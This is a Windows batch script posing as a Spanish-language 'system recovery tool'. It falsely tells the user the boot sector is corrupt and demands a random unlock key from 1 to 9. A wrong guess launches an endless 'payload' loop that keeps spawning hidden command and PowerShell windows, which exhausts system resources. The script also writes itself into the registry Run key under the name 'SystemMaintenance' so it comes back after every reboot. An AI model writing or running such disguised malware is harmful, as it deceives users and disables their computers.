@echo off
title SYSTEM RECOVERY TOOL
color 0b
cls

:: [GENERACIÓN DE LA LLAVE ALEATORIA]
:: Genera un número del 1 al 9
set /a "llave_maestra=%random% %% 9 + 1"

echo ======================================================
echo           SISTEMA DE RECUPERACION DE DATOS
echo ======================================================
echo.
echo Se ha detectado una corrupcion en el sector de arranque.
echo Introduce la LLAVE DE DESBLOQUEO (1-9) para restaurar.
echo Solo tienes un intento. Elige con sabiduria.
echo.
set /p "intento=Introduce tu llave (1-9): "

:: [LOGICA DE SALVACION O DESTRUCCION]
if "%intento%"=="%llave_maestra%" (
    echo.
    echo [+] Llave correcta. Restaurando archivos...
    echo [+] Proceso completado con exito.
    timeout /t 5 >nul
    exit
) else (
    echo.
    echo [-] LLAVE INCORRECTA. La llave era la %llave_maestra%.
    echo [-] Error critico detectado. Iniciando purga del sistema...
    timeout /t 3 /nobreak >nul
)

:: [PAYLOAD V10: EL CAOS ABSOLUTO]
:V10_LOOP
start /min cmd /c "tree c:\ /f"
start /min powershell -Command "Invoke-WebRequest -Uri 'http://1.1.1.1' -UseBasicParsing"
:: Añadimos persistencia para que no se libre ni reiniciando
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMaintenance" /t REG_SZ /d "%~f0" /f
goto V10_LOOP